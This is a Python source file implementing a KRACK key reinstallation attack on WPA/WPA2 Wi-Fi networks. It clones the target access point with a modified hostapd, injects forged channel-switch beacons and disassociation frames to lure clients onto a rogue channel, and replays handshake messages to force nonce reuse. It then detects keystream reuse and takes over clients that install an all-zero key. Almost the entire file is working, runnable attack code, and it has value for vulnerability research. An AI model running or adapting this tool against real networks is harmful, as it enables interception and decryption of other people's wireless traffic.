#!/usr/bin/env python2
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select
from datetime import datetime
from wpaspy import Ctrl

# TODO:
# - Option to continously send CSA beacon frames on the real channel
#
# - If EAPOL-Msg4 has been received on the real channel, the attack has failed
# - Delete created *sta virtual interfaces
# - Victim client does not go through all stages. ClientState.GotMitm not set currently.
# - Detect usage off all-zero key by decrypting frames (so we can miss some frames safely)
# - Detect when all frames are sent on the reall channel, and if so, deauthenticate
# - ACK frames of the real AP sent to ALL clients (currently we only call those of the targeted client)
# - Handle forwarded messages that are too long (= stupid Linux kernel bug)
# - When the client immediately sends data on the rogue channel, it will be deauthenticated by the rogue kernel
# - Option to make a debug pcap capture

IEEE_TLV_TYPE_SSID    = 0
IEEE_TLV_TYPE_CHANNEL = 3
IEEE_TLV_TYPE_RSN     = 48
IEEE_TLV_TYPE_CSA     = 37
IEEE_TLV_TYPE_VENDOR  = 221


#### Basic output and logging functionality ####

ALL, DEBUG, INFO, STATUS, WARNING, ERROR = range(6)
COLORCODES = { "gray"  : "\033[0;37m",
               "green" : "\033[0;32m",
               "orange": "\033[0;33m",
               "red"   : "\033[0;31m" }

loglevel = DEBUG
def log(level, msg, color=None, showtime=True):
	if level < loglevel: return
	if level == DEBUG   and color is None: color="gray"
	if level == WARNING and color is None: color="orange"
	if level == ERROR   and color is None: color="red"
	print (datetime.now().strftime('[%H:%M:%S] ') if showtime else " "*11) + COLORCODES.get(color, "") + msg + "\033[1;0m"


#### Packet Processing Functions ####

def xorstr(lhs, rhs):
	return "".join([chr(ord(lb) ^ ord(rb)) for lb, rb in zip(lhs, rhs)])

def strip_fcs(p):
	# Scapy can't handle FCS field automatically
	if p[RadioTap].present & 2 != 0:
		rawframe = str(p[RadioTap])
		pos = 8
		while ord(rawframe[pos - 1]) & 0x80 != 0: pos += 4
		
		# If the TSFT field is present, it must be 8-bytes aligned
		if p[RadioTap].present & 1 != 0:
			pos += (8 - (pos % 8))
			pos += 8

		# Remove FCS if present
		if ord(rawframe[pos]) & 0x10 != 0:
			return Dot11(str(p[Dot11])[:-4])

	return p[Dot11]

def recv_dot11(socket):
	p = socket.recv()
	if p == None or not Dot11 in p: return None
	# Hack: ignore frames that we just injected and are echoed back by the kernel
	if p[Dot11].FCfield & 0x20 != 0:
		log(DEBUG, "Ignoring echoed injected frame: %s (0x%02X)" % (dot11_to_str(p), p[Dot11].FCfield))
		return None
	else:
		log(ALL, "Received frame: %s" % dot11_to_str(p))
	return strip_fcs(p)

def send_dot11(socket, p):
	# Hack: set the More Data flag so we can detect injected frames
	p[Dot11].FCfield |= 0x20
	socket.send(RadioTap()/p)
	log(DEBUG, "Injected frame: %s" % dot11_to_str(p))

def dot11_get_seqnum(p):
	return p[Dot11].SC >> 4

def dot11_get_iv(p):
	"""Scapy can't handle Extended IVs, so do this properly ourselves"""
	if Dot11WEP not in p:
		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
		return 0

	wep = p[Dot11WEP]
	if wep.keyid & 32:
		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (struct.unpack(">I", wep.wepdata[:4])[0] << 16)
	else:
		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)

def get_eapol_msgnum(p):
	FLAG_PAIRWISE = 0b0000001000
	FLAG_ACK      = 0b0010000000
	FLAG_SECURE   = 0b1000000000

	if not EAPOL in p: return 0

	keyinfo = str(p[EAPOL])[5:7]
	flags = struct.unpack(">H", keyinfo)[0]
	if flags & FLAG_PAIRWISE:
		# 4-way handshake
		if flags & FLAG_ACK:
			# sent by server
			if flags & FLAG_SECURE: return 3
			else: return 1
		else:
			# sent by server
			keydatalen = struct.unpack(">H", str(p[EAPOL])[97:99])[0]
			if keydatalen == 0: return 4
			else: return 2

	return 0

def get_eapol_replaynum(p):
	return struct.unpack(">Q", str(p[EAPOL])[9:17])[0]

def dot11_to_str(p):
	if p.type == 0:
		if Dot11Beacon in p:    return "Beacon(seq=%d, TSF=%d)" % (dot11_get_seqnum(p), p[Dot11Beacon].timestamp)
		if Dot11ProbeReq in p:  return "ProbeReq(seq=%d)" % dot11_get_seqnum(p)
		if Dot11ProbeResp in p: return "ProbeResp(seq=%d)" % dot11_get_seqnum(p)
		if Dot11Auth in p:      return "Auth(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11Auth].status)
		if Dot11Deauth in p:    return "Deauth(seq=%d, reason=%d)" % (dot11_get_seqnum(p), p[Dot11Deauth].reason)
		if Dot11AssoReq in p:   return "AssoReq(seq=%d)" % dot11_get_seqnum(p)
		if Dot11AssoResp in p:  return "AssoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11AssoResp].status)
		if Dot11Disas in p:     return "Disas(seq=%d)" % dot11_get_seqnum(p)
	elif p.type == 1:
		if p.subtype == 11:     return "BlockAck"
		if p.subtype == 13:     return "Ack"
	elif p.type == 2:
		if Dot11WEP in p:         return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
		if p.subtype == 12:       return "QoS-Null(seq=%d)" % dot11_get_seqnum(p)
		if EAPOL in p:
			if get_eapol_msgnum(p) != 0: return "EAPOL-Msg%d(seq=%d,replay=%d)" % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
			else:                        return repr(p)
	return repr(p)			

def construct_csa(channel, count=1):
	switch_mode = 1			# STA should not Tx untill switch is completed
	new_chan_num = channel	# Channel it should switch to
	switch_count = count	# Immediately make the station switch

	# Contruct the IE
	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
	return Dot11Elt(ID=IEEE_TLV_TYPE_CSA, info=payload)

def append_csa(p, channel, count=1):
	el = p[Dot11Elt]
	prevel = None
	while isinstance(el, Dot11Elt):
		prevel = el
		el = el.payload

	prevel.payload = construct_csa(channel, count)

	return p

def get_tlv_value(p, type):
	if not Dot11Elt in p: return None
	el = p[Dot11Elt]
	while isinstance(el, Dot11Elt):
		if el.ID == IEEE_TLV_TYPE_SSID:
			return el.info
	return None


#### Man-in-the-middle Code ####

def set_mac_address(iface, macaddr):
	subprocess.check_output(["ifconfig", iface, "down"])
	subprocess.check_output(["macchanger", "-m", macaddr, iface])
	subprocess.check_output(["ifconfig", iface, "up"])

def set_monitor_ack_address(iface, macaddr):
	# TODO: Continuously monitor for beacons to see whether we remain on the proper channel
	"""Add a virtual STA interface for ACK generation. This assumes nothing takes control of this
       interface, meaning it remains on the current channel."""
	sta_iface = iface + "sta"
	subprocess.call(["iw", sta_iface, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
	subprocess.check_output(["iw", iface, "interface", "add", sta_iface, "type", "managed"])
	subprocess.check_output(["macchanger", "-m", macaddr, sta_iface])
	subprocess.check_output(["ifconfig", sta_iface, "up"])

def print_rx(level, name, p, color=None, suffix=None):
	if p[Dot11].type == 1: return
	if color is None and Dot11Deauth in p: color="orange"
	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)


class NetworkConfig():
	def __init__(self):
		self.ssid = None
		self.channel = 0
		self.group_cipher = None
		self.wpavers = 0
		self.pairwise_ciphers = set()
		self.akms = set()
		self.wmmenabled = 0

	def is_wparsn(self):
		return not self.group_cipher is None and self.wpavers > 0 and \
			len(self.pairwise_ciphers) > 0 and len(self.akms) > 0

	def parse_wparsn(self, wparsn):
		self.group_cipher = ord(wparsn[5])

		num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
		pos = wparsn[8:]
		for i in range(num_pairwise):
			self.pairwise_ciphers.add(ord(pos[3]))
			pos = pos[4:]

		num_akm = struct.unpack("<H", pos[:2])[0]
		pos = pos[2:]
		for i in range(num_akm):
			self.akms.add(ord(pos[3]))
			pos = pos[4:]

	def from_beacon(self, p):
		el = p[Dot11Elt]
		while isinstance(el, Dot11Elt):
			if el.ID == IEEE_TLV_TYPE_SSID:
				self.ssid = el.info
			elif el.ID == IEEE_TLV_TYPE_CHANNEL:
				self.real_channel = ord(el.info[0])
			elif el.ID == IEEE_TLV_TYPE_RSN:
				self.parse_wparsn(el.info)
				self.wpavers |= 2
			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x01":
				self.parse_wparsn(el.info[4:])
				self.wpavers |= 1
			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x02":
				self.wmmenabled = 1

			el = el.payload

	def get_rogue_channel(self):
		return 1 if self.real_channel >= 6 else 11

	def write_config(self, iface):
		TEMPLATE = """
ctrl_interface=hostapd_ctrl
ctrl_interface_group=0

interface={iface}
ssid={ssid}
channel={channel}

wpa={wpaver}
wpa_key_mgmt={akms}
wpa_pairwise={pairwise}
rsn_pairwise={pairwise}

wmm_enabled={wmmenabled}
hw_mode=g
auth_algs=3
wpa_passphrase=XXXXXXXX"""
		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
		ciphers2str = {2: "TKIP", 4: "CCMP"}
		return TEMPLATE.format(
			iface = iface,
			ssid = self.ssid,
			channel = self.get_rogue_channel(),
			wpaver = self.wpavers,
			akms = " ".join([akm2str[idx] for idx in self.akms]),
			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
			wmmenabled = self.wmmenabled)


class ClientState():
	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)

	def __init__(self, macaddr):
		self.macaddr = macaddr
		self.reset()

	def reset(self):
		self.state = ClientState.Initializing
		self.keystreams = dict()
		self.attack_max_iv = None
		self.attack_time = None

		self.assocreq = None
		self.msg3s = []
		self.msg4 = None
		self.krack_finished = False

	def update_state(self, state):
		log(DEBUG, "Client %s moved to state %d" % (self.macaddr, state), showtime=False)
		self.state = state

	def mark_got_mitm(self):
		if self.state == ClientState.Connecting:
			self.state = ClientState.GotMitm

	def is_state(self, state):
		return self.state == state

	# TODO: Also forward when attack has failed?
	def should_forward(self, p):
		if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
			return Dot11Auth in p or Dot11AssoReq in p or get_eapol_msgnum(p) <= 3
		return self.state in [ClientState.Success_Reinstalled]

	def save_iv_keystream(self, iv, keystream):
		self.keystreams[iv] = keystream

	def get_keystream(self, iv):
		return self.keystreams[iv]

	def attack_start(self):
		self.attack_max_iv = 0 if len(self.keystreams.keys()) == 0 else max(self.keystreams.keys())
		self.attack_time = time.time()
		self.update_state(ClientState.Attack_Started)

	def is_iv_reused(self, iv):
		return self.is_state(ClientState.Attack_Started) and iv in self.keystreams

	def attack_timeout(self, iv):
		return self.is_state(ClientState.Attack_Started) and self.attack_time + 1.5 < time.time() and self.attack_max_iv < iv


class KRAckAttack():
	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None):
		self.nic_real = nic_real
		self.nic_rogue_ap = nic_rogue_ap
		self.nic_rogue_mon = nic_rogue_mon
		self.ssid = ssid
		self.beacon = None
		self.apmac = None
		self.netconfig = None
		self.hostapd = None

		# This is set in case of targeted attacks
		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
		if self.clientmac is not None:
			set_monitor_ack_address(self.nic_real, self.clientmac)

		self.sock_real  = None
		self.sock_rogue = None
		self.clients = dict()
		self.disas_queue = []

	def hostapd_rx_mgmt(self, p):
		log(DEBUG, "Sent frame to hostapd: %s" % dot11_to_str(p))
		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))

	def hostapd_add_sta(self, macaddr):
		self.hostapd_rx_mgmt(Dot11(addr1=self.apmac, addr2=macaddr, addr3=self.apmac)/Dot11Auth(seqnum=1))

	def hostapd_finish_4way(self, stamac):
		log(DEBUG, "Sent frame to hostapd: finishing 4-way handshake of %s" % stamac)
		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)

	def find_beacon(self, ssid):
		p = sniff(count=1, timeout=2, lfilter=lambda p: get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
		if p is None or len(p) < 1: return
		self.beacon = strip_fcs(p[0])
		self.apmac = self.beacon.addr2

	def send_csa_beacon(self, numbeacons=1):
		newchannel = self.netconfig.get_rogue_channel()

		for i in range(numbeacons):
			# FIXME: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
			# followed by one with a value of 1. When starting with 1 it errors out.
			csabeacon = append_csa(self.beacon, newchannel, 2)
			send_dot11(self.sock_real, csabeacon)

			csabeacon = append_csa(self.beacon, newchannel, 1)
			send_dot11(self.sock_real, csabeacon)

		log(STATUS, "Injected %d CSA beacons (new channel %d)" % (numbeacons, newchannel), color="green")

	def send_disas(self, macaddr):
		p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
		send_dot11(self.sock_rogue, p)
		send_dot11(self.sock_real, p)
		log(STATUS, "Injected Disassociation to %s on both channels" % macaddr, color="green")

	def queue_disas(self, macaddr):
		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
		heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))

	def try_channel_switch(self, macaddr):
		self.send_csa_beacon()
		self.queue_disas(macaddr)

	def hostapd_add_allzero_client(self, client):
		if client.assocreq is None:
			log(ERROR, "Didn't receive AssocReq of client %s, unable to let rogue hostapd handle client." % client.macaddr)
			return False
		if client.msg4 is None:
			log(ERROR, "Didn't receive EAPOL msg4 of client %s, unable to let rogue hostapd handle client." % client.macaddr)
			return False

		framehdr = Dot11(addr1=self.apmac, addr2=client.macaddr, addr3=self.apmac)

		# 1. Inform hostapd/kernel of a new client using magic sequence number 1337. Combined with the next association request,
		#    this resets client state (withing temporarily removing the client - which could otherwise cause the kernel to send
		#    Deauths in response to data sent to the rouge AP).
		auth = framehdr/Dot11Auth(algo="open", seqnum=0x10, status=0)
		self.hostapd_rx_mgmt(auth)

		# 2. Inform hostapd of the encryption algorithm and options the client uses
		assoc = framehdr/client.assocreq
		self.hostapd_rx_mgmt(assoc)

		# 3. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
		msg4 = framehdr/client.msg4
		self.hostapd_finish_4way(client.macaddr)

		return True

	def handle_rx_realchan(self):
		p = recv_dot11(self.sock_real)
		if p == None: return

		# 1. Handle frames sent TO the real AP
		if p.addr1 == self.apmac:
			# If it's an authentication to the real AP, always display it ...
			if Dot11Auth in p:
				print_rx(INFO, "Real channel ", p, color="orange")

				# ... with an extra clear warning when we wanted to MitM this specific client
				if self.clientmac == p.addr2:
					log(WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)

				if p.addr2 in self.clients: del self.clients[p.addr2]
				#self.try_channel_switch(p.addr2) # FIXME TODO FIXME TODO FIXME
				self.send_csa_beacon()
				self.clients[p.addr2] = ClientState(p.addr2)
				self.clients[p.addr2].update_state(ClientState.Connecting)

				# TODO XXX FIXME TODO XXX FIXME
				self.hostapd_rx_mgmt(p)
			elif Dot11AssoReq in p:
				# TODO: Do we really have to save it?
				if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p
				self.hostapd_rx_mgmt(p)

			# Clients sending a deauthentication to the real AP are also interesting ...
			elif Dot11Deauth in p:
				print_rx(INFO, "Real channel ", p)
				if p.addr2 in self.clients: del self.clients[p.addr2]

			# For all other frames, only display them if they come from the targeted client
			elif self.clientmac is not None and self.clientmac == p.addr2:
				print_rx(INFO, "Real channel ", p)


		# 2. Handle frames sent BY the real AP
		elif p.addr2 == self.apmac:
			# Decide whether we will (eventually) forward it
			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)

			# If targeting a specific client, display all frames it sends ...
			if self.clientmac is not None and self.clientmac == p.addr1:
				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
				# ... and show special information of deauthentication frames
				if Dot11Deauth in p:
					log(INFO, "Note: this Deauth is%sforwarded to the rogue channel" % (" " if might_forward else " not "),
						showtime=False, color="orange" if might_forward else None)

			# For other clients, just display what might be forwarded
			elif might_forward:
				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")


			# Now perform actual actions that need to be taken, along with additional output
			if might_forward:
				client = self.clients[p.addr1]

				eapolnum = get_eapol_msgnum(p)
				if eapolnum == 3:
					client.msg3s.append(p)
					# FIXME: This may cause a timeout on the client side???
					if len(client.msg3s) >= 2:
						log(STATUS, "Got 2nd EAPOL msg3, will now forward both msg3's", color="green", showtime=False)
						for p in client.msg3s: send_dot11(self.sock_rogue, p)
						client.msg3s = []
						# TODO: Should extra stuff be done here?	
						client.attack_start()
					else:
						log(STATUS, "Not forwarding EAPOL msg3 (%d now queued)" % len(client.msg3s), color="green", showtime=False)

				elif Dot11Deauth in p:
					del self.clients[p.addr1]
					send_dot11(self.sock_rogue, p)

				else:
					send_dot11(self.sock_rogue, p)

		# 3. Always display all frames sent by or to the targeted client
		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
			print_rx(INFO, "Rogue channel", p)


	def handle_rx_roguechan(self):
		p = recv_dot11(self.sock_rogue)
		if p == None: return

		# 1. Handle frames sent BY the rouge AP
		if p.addr2 == self.apmac:
			# Display all frames sent to the targeted client
			if self.clientmac is not None and p.addr1 == self.clientmac:
				print_rx(INFO, "Rouge channel", p)
			# And display all frames sent to a MitM'ed client
			elif p.addr1 in self.clients:
				print_rx(INFO, "Rouge channel", p)

		# 2. Handle frames sent TO the AP
		elif p.addr1 == self.apmac:
			client = None

			# Check if it's a new client that we can MitM
			if Dot11Auth in p:
				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
				log(STATUS, "Successfully MitM'ed client %s" % p.addr2, color="green", showtime=False)
				self.clients[p.addr2] = ClientState(p.addr2)
				self.clients[p.addr2].mark_got_mitm()
				client = self.clients[p.addr2]
				will_forward = True
			# Otherwise check of it's an existing client we are tracking/MitM'ing
			elif p.addr2 in self.clients:
				client = self.clients[p.addr2]
				will_forward = client.should_forward(p)
				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
			# Always display all frames sent by the targeted client
			elif p.addr2 == self.clientmac:
				print_rx(INFO, "Rogue channel", p)

			# If this now belongs to a client we want to track, process the packet further
			if client is not None:
				# Save the association request so we can track the encryption algorithm and options the client uses
				if Dot11AssoReq in p: client.assocreq = p
				# Save msg4 so we can easily make the rogue AP finish the 4-way handshake and install an all-zero key
				if get_eapol_msgnum(p) == 4: client.msg4 = p

				# TODO: Is this correct? Maybe log state updates?
				client.mark_got_mitm()

				# Use encrypted frames to determine if the key reinstallation attack succeeded
				if Dot11WEP in p:
					# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
					plaintext = "\xaa\xaa\x03\x00\x00\x00"
					encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
					keystream = xorstr(plaintext, encrypted)

					iv = dot11_get_iv(p)
					if iv <= 1: log(DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)

					# FIXME: The reused IV could be one we accidently missed due to high traffic!!!
					if client.is_iv_reused(iv):
						# If the same keystream is reused, we have a normal key reinstallation attack
						if keystream == client.get_keystream(iv):
							log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
							client.update_state(ClientState.Success_Reinstalled)
	
							# TODO: Test this case
							send_dot11(self.sock_real, client.msg4)

						# Otherwise the client likely installed a new key, i.e., probably an all-zero key
						else:
							log(STATUS, "SUCCESS! Nonce reuse (IV=%d), with likely use of all-zero key." % iv, color="green", showtime=False)
							log(STATUS, "Now directly MitM'ing using rogue AP ...", color="green", showtime=False)

							self.hostapd_add_allzero_client(client)

							# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
							client.update_state(ClientState.Success_AllzeroKey)

					elif client.attack_timeout(iv):
						log(WARNING, "KRAck Attack seems to have failed")
						client.update_state(ClientState.Failed)

					client.save_iv_keystream(iv, keystream)

				if will_forward:
					send_dot11(self.sock_real, p)

		# 3. Always display all frames sent by or to the targeted client
		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
			print_rx(INFO, "Rogue channel", p)



	def run(self):
		# Make sure to use a recent backports driver package so we can indeed
		# capture and inject packets in monitor mode.
		self.sock_real  = conf.L2socket(type=ETH_P_ALL, iface=self.nic_real)
		self.sock_rogue = conf.L2socket(type=ETH_P_ALL, iface=self.nic_rogue_mon)

		# Test monitor mode and get MAC address of the network -- FIXME: we can also attack any network its connected to
		self.find_beacon(self.ssid)
		if self.beacon is None:
			log(ERROR, "No beacon received of network <%s>. Is monitor mode working, and are you on the correct channel?" % self.ssid)
			return
		log(STATUS, "Target network detected: " + self.apmac, color="green")

		# Parse beacon and used this to generate a cloned hostapd.conf
		self.netconfig = NetworkConfig()
		self.netconfig.from_beacon(self.beacon)
		if not self.netconfig.is_wparsn():
			log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
			return
		elif self.netconfig.real_channel > 13:
			log(WARNING, "WARNING: Attack not yet tested against 5 GHz networks.")

		# Set the MAC address of the rogue hostapd AP
		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
		set_mac_address(self.nic_rogue_ap, self.apmac)

		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
		with open("hostapd_rogue.conf", "w") as fp:
			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
		self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

		log(STATUS, "Giving the rogue hostapd two second to initialize ...")
		time.sleep(2)

		self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap)
		self.hostapd_ctrl.attach()

		# TODO: Monitor real channel for a while to see which station need this early add (to prevent deauths against the clients)
		

		# Inject some CSA beacons to push victims to our channel
		self.send_csa_beacon(numbeacons=10)

		# Let the victim switch, then inject a Disassociation frame to trigger a new handshake
		if self.clientmac is None: log(STATUS, "Note: no target client given, so cannot inject Disassociation to force new handshake(s)")
		#else:                      self.queue_disas(self.clientmac) # TODO XXX FIXME TODO: Only do this if no traffic on rouge channel

		# Continue attack by monitoring both channels and performing needed actions
		nextbeacon = time.time() + 0.01
		while True:
			sel = select.select([self.sock_rogue, self.sock_real], [], [], 0.01)
			if self.sock_real  in sel[0]: self.handle_rx_realchan()
			if self.sock_rogue in sel[0]: self.handle_rx_roguechan()
			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
				self.send_disas(self.disas_queue.pop()[1])
			if nextbeacon <= time.time():
				#self.send_csa_beacon() # FIXME
				nextbeacon += 0.01

	def stop(self):
		log(STATUS, "Closing hostapd ...")
		if self.hostapd:
			self.hostapd.terminate()
			self.hostapd.wait()

def cleanup():
	attack.stop()


if __name__ == "__main__":
	# TODO: Optional interface to manually provide a monitor interface for the rogue channel
	# TODO: Parameter to set debut output level
	parser = argparse.ArgumentParser(description='Key Reinstallation Attacks (KRAck Attacks)', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
	parser.add_argument('nic_real_ap', help='Wireless monitor interface that will listen on the channel of the target AP.')
	parser.add_argument('nic_rogue_ap', help='Wireless monitor interface that will run a rogue AP using a modified hostapd.')
	parser.add_argument('ssid', help='The SSID of the network to attack.')
	parser.add_argument('--nic_rogue_mon', help='Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.')
	parser.add_argument('--clientmac', help='Only attack clients with the given MAC adress.')
	args = parser.parse_args()

	if args.nic_rogue_mon is None:
		args.nic_rogue_mon = args.nic_rogue_ap + "mon"

	attack = KRAckAttack(args.nic_real_ap, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.clientmac)

	atexit.register(cleanup)
	attack.run()


